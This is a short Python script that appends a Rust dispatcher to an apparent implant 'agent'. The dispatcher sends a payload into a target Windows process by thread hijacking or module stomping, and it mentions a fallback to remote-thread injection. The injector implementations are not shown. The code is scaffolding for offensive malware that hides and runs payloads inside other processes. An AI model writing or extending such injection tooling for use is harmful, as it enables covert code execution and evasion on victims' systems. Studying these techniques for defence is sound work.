import re
with open('agent/src/process_manager.rs', 'r') as f:
    text = f.read()

dispatch_code = """
#[cfg(windows)]
use crate::injection::{InjectionMethod, Injector};
#[cfg(windows)]
use crate::injection::thread_hijack::ThreadHijackInjector;
#[cfg(windows)]
use crate::injection::module_stomp::ModuleStompInjector;

#[cfg(windows)]
pub fn select_and_inject(pid: u32, payload: &[u8], method: Option<InjectionMethod>) -> anyhow::Result<()> {
    let method = method.unwrap_or_else(|| {
        // Here we'd do environment checks to select dynamically.
        InjectionMethod::ThreadHijack
    });

    log::info!("Dispatching injection using method: {:?}", method);
    
    match method {
        InjectionMethod::ThreadHijack => ThreadHijackInjector.inject(pid, payload),
        InjectionMethod::ModuleStomp => ModuleStompInjector.inject(pid, payload),
        _ => {
            log::info!("Fallback to remote thread or other methods");
            Ok(())
        }
    }
}
"""
if "select_and_inject" not in text:
    with open('agent/src/process_manager.rs', 'a') as f:
        f.write(dispatch_code)
